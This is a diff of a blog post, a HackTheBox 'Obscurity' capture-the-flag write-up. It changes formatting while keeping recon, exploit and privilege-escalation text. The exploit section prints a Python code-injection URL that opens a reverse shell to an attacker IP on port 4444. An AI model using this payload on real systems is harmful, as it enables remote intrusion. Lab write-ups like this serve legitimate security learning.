@@ -1,17 +1,21 @@
 ---
-layout: post
+layout: single
 title: "Obscurity write-up"
 date: 2020-05-17 00:22:00 -0000
-categories: jekyll
+categories: hackthebox
+classes: wide
 permalink: /htb/htbObscurity
 tags: [python, source code, encryption, decryption]
+header:
+  teaser: /asset/htbwriteup/linux/obscurity/intro.png
+  teaser_home_page: true
 
 ---
 
 # HTB - Obscurity
 
 ![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/intro.png "obscurity intro")
-### Recon
+## Recon
     nmap -sV 10.10.10.168 
     
 ![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/1.png)
@@ -206,7 +210,7 @@ Here:
 
 ![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/6_vulnerablecode.png)
 
-### Exploit
+## Exploit
 - So, we insert the [python reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) from PayloadsAllTheThings github to the URL and get the nc to listen to our payload.
 
 `http://10.10.10.168:8080/';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.115",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
@@ -242,7 +246,7 @@ Here:
 
 ![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/13user.png)
 
-### Privilege escalation
+## Privilege escalation
 
 - To escalate we tried basic enum using `sudo -l` and found that `robert` can run `BetterSSH.py` without any password as `root`.
 
